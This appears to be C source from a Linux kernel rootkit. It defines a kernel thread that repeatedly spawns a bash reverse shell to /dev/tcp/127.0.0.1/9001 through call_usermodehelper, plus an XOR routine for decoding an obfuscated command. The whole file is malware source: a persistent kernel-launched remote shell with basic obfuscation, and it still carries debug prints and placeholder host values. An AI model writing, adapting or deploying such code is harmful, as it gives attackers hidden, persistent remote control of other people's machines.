#include "tasks/reverse_shell.h"

void xor_decrypt(char* s) {
    while (*s != '\0') {
        *s ^= XOR_KEY;
        s++;
    }
}

int rshell_func(void* data) {
    char xor_cmd[] = RSHELL_CMD_OBF;
    if (xor_cmd[0] == '\0') {
        pr_info("its empty");
        while (!kthread_should_stop()) { // todo prettify
            ssleep(10);
        }
        return 0;
    }
    char command[256];
    snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1", "127.0.0.1", "9001");

    xor_decrypt(xor_cmd);
    pr_info("hey %s", xor_cmd);

    char* argv[] = { "/bin/bash", "-c", command, NULL };
    static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        while (!kthread_should_stop()) {
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            ssleep(10);
        }

    return 0;
}
